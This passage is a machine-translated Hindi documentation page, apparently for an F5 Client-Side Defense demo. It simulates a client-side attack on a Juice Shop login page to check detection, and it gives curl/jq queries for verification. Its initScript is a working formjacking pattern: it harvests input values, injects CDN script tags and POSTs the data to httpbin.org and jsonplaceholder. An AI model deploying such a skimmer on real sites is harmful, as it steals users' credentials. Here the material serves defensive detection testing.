@@ -1,0 +1,259 @@
+---
+title: Phase 2 — हमला
+description: >-
+  CSD detection को ट्रिगर करने के लिए पूर्व-निर्मित स्क्रिप्ट का उपयोग करके
+  क्लाइंट-साइड हमले के ट्रैफ़िक का अनुकरण करें
+sidebar:
+  order: 3
+  label: Phase 2 — हमला
+i18n:
+  sourceHash: 7f35d419bf2b
+  translator: machine
+---
+
+import { Aside, Steps } from "@astrojs/starlight/components";
+
+Phase 2 संरक्षित एप्लिकेशन के विरुद्ध सिम्युलेटेड हमले का ट्रैफ़िक उत्पन्न करता है और पुष्टि करता है कि CSD ने इसे पहचाना है। Phase 1 पूर्ण होना चाहिए — सभी Step 7 जांचें PASS — आगे बढ़ने से पहले।
+
+## Step 8: हमले का अनुकरण
+
+<Aside type="note">
+इस चरण के लिए ब्राउज़र-साइड JavaScript निष्पादन की आवश्यकता है — `curl` CSD detection को ट्रिगर नहीं कर सकता। ब्राउज़र ऑटोमेशन टूल (MCP Chrome DevTools, Playwright, Puppeteer) वाले AI सहायक नीचे दिए गए **AI-Automated Execution** क्रम का उपयोग करके ये चरण सीधे निष्पादित करते हैं। ब्राउज़र ऑटोमेशन के बिना ऑपरेटर मैनुअल चरणों को निष्पादित करते हैं।
+</Aside>
+
+अवसंरचना सत्यापित होने के बाद (सभी Phase 1 Step 7 जांचें PASS), CSD detections उत्पन्न करने के लिए हमले का अनुकरण स्क्रिप्ट चलाएं। स्क्रिप्ट [Trigger Detection](/csd/trigger-detection/) गाइड और [Attack Script Library](/csd/attack-scripts/) में परिभाषित हैं।
+
+### AI-Automated Execution
+
+ब्राउज़र ऑटोमेशन टूल वाले AI सहायक हमले का अनुकरण प्रोग्रामेटिक रूप से चलाते हैं:
+
+1. **initScript के साथ नेविगेट करें** — पहले एक स्वच्छ दस्तावेज़ संदर्भ सुनिश्चित करने के लिए `about:blank` पर नेविगेट करें (पूर्व नेविगेशन से पुरानी initScripts से बचें), फिर `navigate_page` को `http://$F5XC_DOMAINNAME/#/login` पर एक `initScript` के साथ करें जो zone.js पैच करने से पहले नेटिव `setInterval`, `clearInterval`, `fetch`, और `console.log` को सहेजता है, लॉगिन फॉर्म फील्ड के लिए पोल करता है, नेटिव `HTMLInputElement.prototype.value` setter के माध्यम से क्रेडेंशियल भरता है, और तुरंत Combined Detection Script को इनलाइन निष्पादित करता है। नीचे दिए गए verbatim initScript का उपयोग करें।
+2. **Welcome Banner को बंद करें** — `Escape` के साथ `press_key` से Welcome Banner को बंद करने के लिए। बाद की visits पर बैनर प्रदर्शित नहीं हो सकता (कुकीज़ बनी रहती हैं)। कुकी सहमति डायलॉग Escape कुंजी द्वारा स्वचालित रूप से बंद हो जाता है
+3. **समापन की प्रतीक्षा करें** — सभी CDN स्क्रिप्ट load/error कॉलबैक और fetch promise resolutions पूर्ण होने के लिए 10 सेकंड प्रतीक्षा करें
+4. **साक्ष्य कैप्चर करें** — `list_console_messages` को `[CSD Demo] Simulation complete` और CDN load परिणामों के लिए जांचें; `list_network_requests` को `script` और `fetch` प्रकारों के लिए फ़िल्टर करें HTTP status codes (`200`/`201` सफलता के लिए, `pending` आयोजित अनुरोधों के लिए) सत्यापित करने के लिए
+
+**Phase 2 initScript (verbatim — बिल्कुल जैसा लिखा है वैसे ही उपयोग करें):**
+
+```javascript
+// zone.js patches करने से पहले नेटिव references को सहेजें
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// लॉगिन फॉर्म फील्ड के लिए पोल करें, क्रेडेंशियल भरें, detection script चलाएं
+var _poll = _si(function() {
+  var emailEl = document.querySelector('#email');
+  var passEl  = document.querySelector('#password');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // नेटिव setter के माध्यम से क्रेडेंशियल भरें (zone.js को बाईपास करता है)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Combined Detection Script को इनलाइन चलाएं exfil के लिए नेटिव fetch का उपयोग करके
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — शुरुआत');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: फॉर्म फील्ड harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] ' + Object.keys(harvested).length + ' फील्ड harvested किए गए:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] ' + cdn.name + ' से लोड किया गया: ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] ' + cdn.name + ' से अवरुद्ध/विफल: ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Script tag injected: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: डेटा exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] डेटा www.httpbin.org को भेजा गया'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] डेटा jsonplaceholder.typicode.com को भेजा गया'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation समाप्त');
+      _log('[CSD Demo] फील्ड harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN डोमेन)');
+      _log('[CSD Demo] Exfil चैनल: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+<Aside type="caution">
+**zone.js असंगतता** — Juice Shop Angular के zone.js का उपयोग करता है, जो `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest`, और अन्य ब्राउज़र APIs को पैच करता है। यह MCP `evaluate_script`, `fill`, और `click` टूल को `Cannot read properties of undefined (reading 'call')` के साथ तोड़ देता है। इसके बजाय `navigate_page` को `initScript` के साथ उपयोग करें — `initScript` zone.js लोड होने से पहले चलता है, इसलिए आप नेटिव API references को सहेज सकते हैं और उन्हें polling callbacks में उपयोग कर सकते हैं। initScript को नेटिव `HTMLInputElement.prototype.value` setter (न कि `fill`) का उपयोग करके फॉर्म फील्ड भरना चाहिए और detection script को इनलाइन चलाना चाहिए (न कि `setTimeout` के माध्यम से, जो zone.js पृष्ठ लोड के बाद बाधित कर सकता है)। विवरण के लिए [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) देखें।
+</Aside>
+
+<Aside type="note">
+**initScript accumulation** — प्रत्येक `navigate_page` कॉल `initScript` पैरामीटर के साथ स्क्रिप्ट को एक persistent list में जोड़ता है जो हर बाद के document load पर चलता है। पुरानी स्क्रिप्ट हस्तक्षेप से बचने के लिए, runs के बीच `about:blank` पर नेविगेट करें या `new_page` को `isolatedContext` के साथ स्वच्छ ब्राउज़र संदर्भ के लिए उपयोग करें।
+</Aside>
+
+<Aside type="note">
+**initScript में नेटिव `fetch` को सहेजना** — initScript zone.js इसे पैच करने से पहले `window.fetch.bind(window)` को सहेजता है। यह सुनिश्चित करता है कि fetch कॉल zone.js `Cannot read properties of undefined` errors के बिना सही तरीके से काम करते हैं। समान initScript (नेटिव `fetch` के साथ सहेजा गया) Phase 2 और Phase 3 हमले के रन दोनों के लिए उपयोग किया जाता है — CSD mitigation `fetch()` कॉल को बाधित नहीं करता है, इसलिए नेटिव reference को सहेजना mitigation व्यवहार को प्रभावित नहीं करता है।
+</Aside>
+
+<Aside type="caution">
+**Transient origin 404** — Angular एप्लिकेशन पर पहली नेविगेशन पर, `polyfills.js` या अन्य app स्क्रिप्ट origin सर्वर से transient HTTP 404 लौटा सकते हैं। यह Angular को bootstrap करने में विफल करता है, जिससे कोई login form के बिना खाली पृष्ठ होता है। 404 ephemeral है — बाद के अनुरोध 200 या 304 लौटाते हैं। **पुनरुद्धार:** `about:blank` पर नेविगेट करें, 2 सेकंड प्रतीक्षा करें, फिर नेविगेशन को फिर से प्रयास करें। यदि समस्या कई प्रयासों में बनी रहती है, तो load balancer path (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`) के माध्यम से origin health जांचें।
+</Aside>
+
+### Manual Execution
+
+ब्राउज़र ऑटोमेशन टूल के बिना ऑपरेटर चरणों को मैनुअली करते हैं:
+
+1. **नेविगेट करें** संरक्षित एप्लिकेशन login page पर: `http://xF5XC_DOMAINNAMEx/#/login`
+2. **डमी क्रेडेंशियल दर्ज करें** — Email फील्ड में `test@example.com` और Password फील्ड में `P@ssword123` टाइप करें (फॉर्म को submit न करें)
+3. **DevTools खोलें** — **F12** दबाएं और **Console** टैब पर स्विच करें
+4. **Combined Detection Script चलाएं** — [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) से स्क्रिप्ट को console में पेस्ट करें और Enter दबाएं
+5. **Console output सत्यापित करें** — पुष्टि करें कि `[CSD Demo]` phased output दिखाता है: field harvesting, 4 CDN डोमेन से script injection, और 2 endpoints को data exfiltration
+
+### क्या ट्रिगर होता है
+
+| Signal | Behavior | Detection |
+| --- | --- | --- |
+| Form field harvesting | Email और password input values को पढ़ता है | Scripts sensitive form fields को पढ़ रहे हैं — High Risk फ्लैग किया गया |
+| Script injection | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` से 4 `&lt;script&gt;` tags inject करता है | 4 तक नए third-party script डोमेन detected (CDN availability अलग-अलग है) |
+| Data exfiltration | `fetch` के माध्यम से harvested data को `www.httpbin.org` और `jsonplaceholder.typicode.com` को भेजता है | External domains को network कॉल |
+
+<Aside type="note">
+**CDN availability अलग-अलग है।** प्रत्येक run में सभी 4 CDN scripts लोड नहीं होंगे — ब्राउज़र resource limits, network conditions, या CDN throttling कुछ को `ERR_INSUFFICIENT_RESOURCES` या timeout के साथ विफल कर सकता है। simulation सफल है यदि **कोई भी** CDN script लोड हो। CSD script injection attempt को detect करता है चाहे script successfully लोड हो या नहीं — `&lt;script&gt;` tag creation ही detection signal है।
+
+गंभीर cases में, `ERR_INSUFFICIENT_RESOURCES` page-level failure तक escalate हो सकता है — पूरा page blank हो जाता है, screenshots timeout हो जाते हैं, और `take_snapshot` विफल हो जाता है। यह आमतौर पर तब होता है जब heavy initScripts वाली कई navigations समान ब्राउज़र context में accumulate हो जाते हैं। **पुनरुद्धार:** `new_page` को `isolatedContext` के साथ उपयोग करें fresh ब्राउज़र context बनाने के लिए, फिर `about:blank` → `navigate_page` with initScript sequence से retry करें। यह individual CDN script failures से अलग है, जो simulation success को प्रभावित नहीं करते।
+</Aside>
+
+<Aside type="tip">
+हमले का अनुकरण चलाने के बाद, detections की प्रतीक्षा करने के लिए इस deterministic polling loop का उपयोग करें:
+
+1. हर 60 सेकंड में `/detected_domains` को query करें
+2. यदि DET-3 pass होता है (exfil domains `/detected_domains` में दिखाई देते हैं), तुरंत Step 9 पर आगे बढ़ें
+3. यदि 10 queries (10 मिनट) के बाद भी खाली है, तो CSD status (Phase 1 Step 5) और protected domain registration (Phase 1 Step 6) को जांचें — इनमें से कोई misconfigured होने की संभावना है
+4. यदि 30 queries (30 मिनट) के बाद भी खाली है, तो रुकें और ऑपरेटर को रिपोर्ट करें — Phase 3 पर आगे न बढ़ें
+
+अतिरिक्त targeted simulations (individual attack categories, maximum detection stress test) के लिए [Attack Script Library](/csd/attack-scripts/) देखें।
+</Aside>
+
+### Evidence
+
+AI सहायक को निम्नलिखित रिपोर्ट करनी चाहिए। AI-automated execution के लिए, evidence programmatically `list_console_messages` (initScript के polling function results को console में log करते हैं) के माध्यम से कैप्चर किया जाता है। Manual execution के लिए, ऑपरेटर ब्राउज़र console output को पढ़ता है।
+
+| Check | Expected | Status |
+| --- | --- | --- |
+| Login page loaded | `http://$F5XC_DOMAINNAME/#/login` पर `200 OK` | PASS / FAIL |
+| Console script executed | Console output में `[CSD Demo] Simulation complete` | PASS / FAIL |
+| Fields harvested | Console output में count &gt; 0 | PASS |
+| Scripts injected | Console output में 1–4 CDN domains (कुछ resource errors के साथ विफल हो सकते हैं) | PASS यदि कोई भी CDN domain दिखाई देता है |
+| Exfil channels | Console output में 2 fetch POST प्रयास | PASS |
+
+<Aside type="tip">
+यदि HTTPS LB certificate valid है (`CertificateValid`), आप वैकल्पिक रूप से `https://$F5XC_DOMAINNAME/#/login` के विरुद्ध simulation भी चला सकते हैं। यह demo progression के लिए आवश्यक नहीं है।
+</Aside>
+
+## Step 9: API के माध्यम से Detection Verification
+
+Detections दिखाई दिए की पुष्टि करने के लिए CSD API endpoints को query करें। Polling loop का उपयोग करें: हर 60 सेकंड में `/detected_domains` को query करें; जैसे ही DET-3 pass हो आगे बढ़ें। यदि 10 मिनट के बाद DET-3 pass नहीं होता है, तो CSD configuration को जांचें। यदि 30 मिनट के बाद DET-3 pass नहीं होता है, तो रुकें और ऑपरेटर को रिपोर्ट करें। ये endpoints [API Reference](/csd/api-reference/) में दस्तावेज़ित हैं और पिछले चरणों के समान authentication और namespace का उपयोग करते हैं।
+
+<Aside type="note">
+**Endpoint processing order:** `/detected_domains` सबसे पहले populated है और यह प्राथमिक संकेतक है कि CSD pipeline काम कर रहा है। `/scripts` और `/formFields` slower backend processing schedule पर populated होते हैं और कई simulation runs के बाद भी 20–30 मिनट के लिए खाली रह सकते हैं। यदि `/detected_domains` exfil domains (`www.httpbin.org`, `jsonplaceholder.typicode.com`) दिखाता है, तो simulation को successfully detected मानें और आगे बढ़ें — नीचे DET-1 check यह दर्शाता है।
+</Aside>
+
+### Detected Scripts
+
+पिछले 24 घंटों में detected scripts के लिए query करें:
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s -X POST \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  -H "Content-Type: application/json" \
+  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
+```
+
+| Field | Expected | Status |
+| --- | --- | --- |
+| `total` | &gt; 0 (scripts detected) | PASS यदि &gt; 0; PENDING यदि 0 लेकिन `/detected_domains` exfil domains दिखाता है |
+| Script names | CDN domains (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) को `script_name` में शामिल करता है | PASS यदि injected CDN domains दिखाई दें |
+
+### Detected Domains
+
+```bash
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
+  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
+```
+
+| Field | Expected | Status |
+| --- | --- | --- |
+| `total_domains` | &gt; 0 | PASS यदि &gt; 0 |
+| Domain list | CDN और exfil domains को शामिल करता है | PASS यदि expected domains दिखाई दें |
+
+### Form Fields
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
+  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
+```
+
+| Field | Expected | Status |
+| --- | --- | --- |
+| `total` | &gt; 0 | PASS यदि &gt; 0; PENDING यदि 0 लेकिन DET-3 pass करता है |
+| `name` | `email`, `password` को शामिल करता है | PASS यदि sensitive fields दिखाई दें |
+| `sensitivity` | email/password fields के लिए `Sensitive` | PASS यदि ML ने सही तरीके से classify किया है |
+
+<Aside type="note">
+**Form field processing domain detection से धीमा है।** `/formFields` endpoint पहली query पर partial metadata के साथ fields लौटा सकता है। ML sensitivity classification (`Sensitive` vs `Not Sensitive`) backend processing पूर्ण होने के बाद populated होता है — यह पहली simulation run के बाद 20–30 मिनट तक लग सकता है। यदि fields दिखाई दें लेकिन classification नहीं, तो बाद में requery करें। DET-3 (`/detected_domains`) primary pass criteria है।
+</Aside>
+
+### Phase 2 Evidence Summary
+
+सभी detection queries के बाद, अंतिम detection status प्रस्तुत करें:
+
+| Test ID | Check | Status |
+| --- | --- | --- |
+| DET-1 | Scripts detected (`/scripts` endpoint) | PASS यदि &gt; 0; PENDING यदि empty लेकिन DET-3 pass करता है |
+| DET-2 | CDN domains detected | PASS / FAIL |
+| DET-3 | Exfil domains detected (`/detected_domains`) | **Primary indicator** — PASS यदि `www.httpbin.org` या `jsonplaceholder.typicode.com` दिखाई दें |
+| DET-4 | Form fields detected (`/formFields` endpoint) | PASS यदि &gt; 0; PENDING यदि empty लेकिन DET-3 pass करता है |
+
+<Aside type="note">
+**Phase 3 पर आगे बढ़ने के लिए न्यूनतम pass criteria:** DET-3 को PASS करना चाहिए (exfil domains `/detected_domains` में दिखाई दें)। DET-1 और DET-4 पहले उपयोग या fresh rebuild के बाद PENDING दिखा सकते हैं — यह सामान्य है। यदि DET-3 भी 30 मिनट के बाद FAIL दिखाता है, तो सत्यापित करें कि CSD enabled है (Phase 1 Step 5), protected domain registered है (Phase 1 Step 6), और CSD JS tag inject किया जा रहा है (Phase 1 Step 7 JS Configuration check)।
+</Aside>
+
+---
+
+**Phase 2 समाप्त।** mitigation rules लागू करने और verify करने के लिए [Phase 3 — Mitigate](/csd/demo/phase-3-mitigate/) पर आगे बढ़ें कि domains को block किया गया है।
